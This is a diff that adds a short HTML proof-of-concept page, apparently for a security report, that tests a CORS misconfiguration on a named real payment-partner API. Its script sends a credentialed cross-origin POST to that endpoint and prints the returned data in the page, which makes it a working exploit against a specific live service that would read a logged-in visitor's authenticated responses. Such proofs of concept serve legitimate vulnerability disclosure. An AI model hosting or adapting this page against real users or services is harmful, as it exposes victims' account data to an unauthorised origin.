@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h2>PoC: CORS Misconfig</h2>
+    <script>
+      fetch("https://partner-api.alipayplus.com/api/aplus/applySupport.json", {
+        method: "POST",
+        credentials: "include",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ test: "123" })
+      })
+        .then(res => res.text())
+        .then(data => {
+          document.body.innerHTML += "<pre>Response:<br>" + data + "</pre>";
+        })
+        .catch(e => console.error(e));
+    </script>
+  </body>
+</html>
